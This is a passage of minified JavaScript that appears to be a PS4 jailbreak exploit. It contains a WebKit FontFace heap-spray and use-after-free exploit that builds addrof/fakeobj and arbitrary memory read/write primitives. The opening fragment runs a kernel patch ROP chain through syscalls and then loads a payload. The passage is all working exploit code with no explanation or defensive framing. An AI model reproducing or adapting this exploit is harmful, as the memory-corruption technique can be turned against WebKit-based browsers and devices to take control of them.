=6446528;PBV[231]=0;PBV[232]=6447760;PBV[233]=0;PBV[234]=6448928;PBV[235]=0;chain.fcall(window.syscalls[203],patch_buffer,16384);chain.fcall(patch_buffer,p.read8(KERNEL_BASE_PTR));chain.fcall(window.syscalls[73],patch_buffer,16384);chain.run();if(localStorage.HenLoaded=="yes"&&sessionStorage.HenLoaded!="yes"){setTimeout(runBinLoader,500)}else if(localStorage.HenLoaded=="yes"&&sessionStorage.HenLoaded=="yes"){allset()}else if(localStorage.HenLoaded!="yes"){setTimeout(loadPayload,500)}return}alert("Ups! Algo salio mal, reinicie su PS4.");p.write8(0,0);return;resolve(something)},{once:true})})};function runKEX(){extra_gadgets();kchain_setup();object_setup();trigger_spray()}runKEX()}function webkitExploit(){StartTimer();var PAGE_SIZE=16384;var SIZEOF_CSS_FONT_FACE=184;var HASHMAP_BUCKET=208;var STRING_OFFSET=20;var SPRAY_FONTS=4106;var GUESS_FONT=8594325504;var NPAGES=20;var INVALID_POINTER=0;var HAMMER_FONT_NAME="font8";var HAMMER_NSTRINGS=700;var union=new ArrayBuffer(8);var union_b=new Uint8Array(union);var union_i=new Uint32Array(union);var union_f=new Float64Array(union);var bad_fonts=[];for(var i=0;i<SPRAY_FONTS;i++)bad_fonts.push(new FontFace("font1","",{}));var good_font=new FontFace("font2","url(data:text/html,)",{});bad_fonts.push(good_font);var arrays=[];for(var i=0;i<512;i++)arrays.push(new Array(31));arrays[256][0]=1.5;arrays[257][0]={};arrays[258][0]=1.5;var jsvalue={a:arrays[256],b:new Uint32Array(1),c:true};var string_atomifier={};var string_id=1e7;function ptrToString(p){var s="";for(var i=0;i<8;i++){s+=String.fromCharCode(p%256);p=(p-p%256)/256}return s}function stringToPtr(p,o){if(o===undefined)o=0;var ans=0;for(var i=7;i>=0;i--)ans=256*ans+p.charCodeAt(o+i);return ans}var strings=[];function mkString(l,head){var s=head+"\0".repeat(l-STRING_OFFSET-8-head.length)+string_id++;string_atomifier[s]=1;strings.push(s);return s}var guf=GUESS_FONT;var ite=true;var matches=0;var round=0;window.ffses={};do{var p_s=ptrToString(NPAGES+2);for(var i=0;i<NPAGES;i++)p_s+=ptrToString(guf+i*PAGE_SIZE);p_s+=ptrToString(INVALID_POINTER);for(var i=0;i<256;i++)mkString(HASHMAP_BUCKET,p_s);var ffs=ffses["search_"+ ++round]=new FontFaceSet(bad_fonts);var badstr1=mkString(HASHMAP_BUCKET,p_s);var guessed_font=null;var guessed_addr=null;for(var i=0;i<SPRAY_FONTS;i++){bad_fonts[i].family="search"+round;if(badstr1.substr(0,p_s.length)!=p_s){guessed_font=i;var p_s1=badstr1.substr(0,p_s.length);for(var i=1;i<=NPAGES;i++){if(p_s1.substr(i*8,8)!=p_s.substr(i*8,8)){guessed_addr=stringToPtr(p_s.substr(i*8,8));break}}if(matches++==0){guf=guessed_addr+2*PAGE_SIZE;guessed_addr=null}break}}if(ite=!ite)guf+=NPAGES*PAGE_SIZE}while(guessed_addr===null);var p_s="";p_s+=ptrToString(26);p_s+=ptrToString(guessed_addr);p_s+=ptrToString(guessed_addr+SIZEOF_CSS_FONT_FACE);for(var i=0;i<19;i++)p_s+=ptrToString(INVALID_POINTER);for(var i=0;i<256;i++)mkString(HASHMAP_BUCKET,p_s);var needfix=[];for(var i=0;;i++){ffses["ffs_leak_"+i]=new FontFaceSet([bad_fonts[guessed_font],bad_fonts[guessed_font+1],good_font]);var badstr2=mkString(HASHMAP_BUCKET,p_s);needfix.push(mkString(HASHMAP_BUCKET,p_s));bad_fonts[guessed_font].family="evil2";bad_fonts[guessed_font+1].family="evil3";var leak=stringToPtr(badstr2.substr(badstr2.length-8));if(leak<281474976710656)break}function makeReader(read_addr,ffs_name){var fake_s="";fake_s+="0000";fake_s+="ÿ\0\0\0ÿÿÿÿ";fake_s+=ptrToString(read_addr);fake_s+=ptrToString(2147483668);p_s="";p_s+=ptrToString(29);p_s+=ptrToString(guessed_addr);p_s+=ptrToString(guessed_addr+SIZEOF_CSS_FONT_FACE);p_s+=ptrToString(guessed_addr+2*SIZEOF_CSS_FONT_FACE);for(var i=0;i<18;i++)p_s+=ptrToString(INVALID_POINTER);for(var i=0;i<256;i++)mkString(HASHMAP_BUCKET,p_s);var the_ffs=ffses[ffs_name]=new FontFaceSet([bad_fonts[guessed_font],bad_fonts[guessed_font+1],bad_fonts[guessed_font+2],good_font]);mkString(HASHMAP_BUCKET,p_s);var relative_read=mkString(HASHMAP_BUCKET,fake_s);bad_fonts[guessed_font].family=ffs_name+"_evil1";bad_fonts[guessed_font+1].family=ffs_name+"_evil2";bad_fonts[guessed_font+2].family=ffs_name+"_evil3";needfix.push(relative_read);if(relative_read.length<1e3)return makeReader(read_addr,ffs_name+"_");return relative_read}var fastmalloc=makeReader(leak,"ffs3");for(var i=0;i<1e5;i++)mkString(128,"");var props=[];for(var i=0;i<65536;i++){props.push({value:1094927426});props.push({value:jsvalue})}var jsvalue_leak=null;while(jsvalue_leak===null){Object.defineProperties({},props);for(var i=fastmalloc.indexOf("BDCA\0\0þÿ");;i++){if(fastmalloc.charCodeAt(i)==66&&fastmalloc.charCodeAt(i+1)==68&&fastmalloc.charCodeAt(i+2)==67&&fastmalloc.charCodeAt(i+3)==65&&fastmalloc.charCodeAt(i+4)==0&&fastmalloc.charCodeAt(i+5)==0&&fastmalloc.charCodeAt(i+6)==254&&fastmalloc.charCodeAt(i+7)==255&&fastmalloc.charCodeAt(i+24)==14){jsvalue_leak=stringToPtr(fastmalloc,i+32);break}}}var rd_leak=makeReader(jsvalue_leak,"ffs4");var array256=stringToPtr(rd_leak,16);var ui32a=stringToPtr(rd_leak,24);var rd_arr=makeReader(array256,"ffs5");var butterfly=stringToPtr(rd_arr,8);var rd_ui32=makeReader(ui32a,"ffs6");for(var i=0;i<8;i++)union_b[i]=rd_ui32.charCodeAt(i);var structureid_low=union_i[0];var structureid_high=union_i[1];union_i[0]=65536;union_i[1]=0;arrays[257][1]={};arrays[257][0]=union_f[0];union_i[0]=guessed_addr+12*SIZEOF_CSS_FONT_FACE|0;union_i[1]=(guessed_addr-guessed_addr%4294967296)/4294967296;arrays[256][i]=union_f[0];pp_s="";pp_s+=ptrToString(56);for(var i=0;i<12;i++)pp_s+=ptrToString(guessed_addr+i*SIZEOF_CSS_FONT_FACE);var fake_s="";fake_s+="0000";fake_s+=ptrToString(INVALID_POINTER);fake_s+=ptrToString(butterfly);fake_s+='\0\0\0\0"\0\0\0';var ffs7_args=[];for(var i=0;i<12;i++)ffs7_args.push(bad_fonts[guessed_font+i]);ffs7_args.push(good_font);var ffs8_args=[bad_fonts[guessed_font+12]];for(var i=0;i<5;i++)ffs8_args.push(new FontFace(HAMMER_FONT_NAME,"url(data:text/html,)",{}));for(var i=0;i<HAMMER_NSTRINGS;i++)mkString(HASHMAP_BUCKET,pp_s);ffses.ffs7=new FontFaceSet(ffs7_args);mkString(HASHMAP_BUCKET,pp_s);ffses.ffs8=new FontFaceSet(ffs8_args);var post_ffs=mkString(HASHMAP_BUCKET,fake_s);needfix.push(post_ffs);for(var i=0;i<13;i++)bad_fonts[guessed_font+i].family="hammer"+i;function boot_addrof(obj){arrays[257][32]=obj;union_f[0]=arrays[258][0];return union_i[1]*4294967296+union_i[0]}function boot_fakeobj(addr){union_i[0]=addr;union_i[1]=(addr-addr%4294967296)/4294967296;arrays[258][0]=union_f[0];return arrays[257][32]}var arw_master=new Uint32Array(8);var arw_slave=new Uint8Array(1);var obj_master=new Uint32Array(8);var obj_slave={obj:null};var addrof_slave=boot_addrof(arw_slave);var addrof_obj_slave=boot_addrof(obj_slave);union_i[0]=structureid_low;union_i[1]=structureid_high;union_b[6]=7;var obj={jscell:union_f[0],butterfly:true,buffer:arw_master,size:22136};function i48_put(x,a){a[4]=x|0;a[5]=x/4294967296|0}function i48_get(a){return a[4]+a[5]*4294967296}window.addrof=function(x){obj_slave.obj=x;return i48_get(obj_master)};window.fakeobj=function(x){i48_put(x,obj_master);return obj_slave.obj};function read_mem_setup(p,sz){i48_put(p,arw_master);arw_master[6]=sz}window.read_mem=function(p,sz){read_mem_setup(p,sz);var arr=[];for(var i=0;i<sz;i++)arr.push(arw_slave[i]);return arr};window.write_mem=function(p,data){read_mem_setup(p,data.length);for(var i=0;i<data.length;i++)arw_slave[i]=data[i]};window.read_ptr_at=function(p){var ans=0;var d=read_mem(p,8);for(var i=7;i>=0;i--)ans=256*ans+d[i];return ans};window.write_ptr_at=function(p,d){var arr=[];for(var i=0;i<8;i++){arr.push(d&255);d/=256}write_mem(p,arr)};(function(){var magic=boot_fakeobj(boot_addrof(obj)+16);magic[4]=addrof_slave;magic[5]=(addrof_slave-addrof_slave%4294967296)/4294967296;obj.buffer=obj_master;magic[4]=addrof_obj_slave;magic[5]=(addrof_obj_slave-addrof_obj_slave%4294967296)/4294967296;magic=null})();(function(){var ffs_addr=read_ptr_at(addrof(post_ffs)+8)-208;write_mem(ffs_addr,read_mem(ffs_addr-96,208));for(var i=0;i<needfix.length;i++){var addr=read_ptr_at(addrof(needfix[i])+8);write_ptr_at(addr,(HASHMAP_BUCKET-20)*4294967296+1);write_ptr_at(addr+8,addr+20);write_ptr_at(addr+16,2147483668)}write_ptr_at(butterfly+248,133143986207)})();var expl_master=new Uint32Array(8);var expl_slave=new Uint32Array(2);var addrof_expl_slave=addrof(expl_slave);var m=fakeobj(addrof(obj)+16);obj.buffer=expl_slave;m[7]=1;obj.buffer=expl_master;m[4]=addrof_expl_slave;m[5]=(addrof_expl_slave-addrof_expl_slave%4294967296)/4294967296;m[7]=1;var prim={write8:function(addr,value){expl_master[4]=addr.low;expl_master[5]=addr.hi;if(value instanceof int64){expl_slave[0]=value.low;expl_slave[1]=value.hi}else{expl_slave[0]=value;expl_slave[1]=0}},write4:function(addr,value){expl_master[4]=addr.low;expl_master[5]=addr.hi;if(value instanceof int64){expl_slave[0]=value.low}else{expl_slave[0]=value}},write2:function(addr,value){expl_master[4]=addr.low;expl_master[5]=addr.hi;var tmp=expl_slave[0]&4294901760;if(value instanceof int64){expl_slave[0]=value.low&65535|tmp}else{expl_slave[0]=value&65535|tmp}},write1:function(addr,value){expl_master[4]=addr.low;expl_master[5]=addr.hi;var tmp=expl_slave[0]&4294967040;if(value instanceof int64){expl_slave[0]=value.low&255|tmp}else{expl_slave[0]=value&255|tmp}},read8:function(addr){expl_master[4]=addr.low;expl_master[5]=addr.hi;return new int64(expl_slave[0],expl_slave[1])},read4:function(addr){expl_master[4]=addr.low;expl_master[5]=addr.hi;return expl_slave[0]},read2:function(addr){expl_master[4]=addr.low;expl_master[5]=addr.hi;return expl_slave[0]&65535},read1:function(addr){expl_master[4]=addr.low;expl_master[5]=addr.hi;return expl_slave[0]&255},leakval:function(obj){obj_slave.obj=obj;return new int64(obj_master[4],obj_master[5])}};EndTimer();window.p=prim;run_hax()}
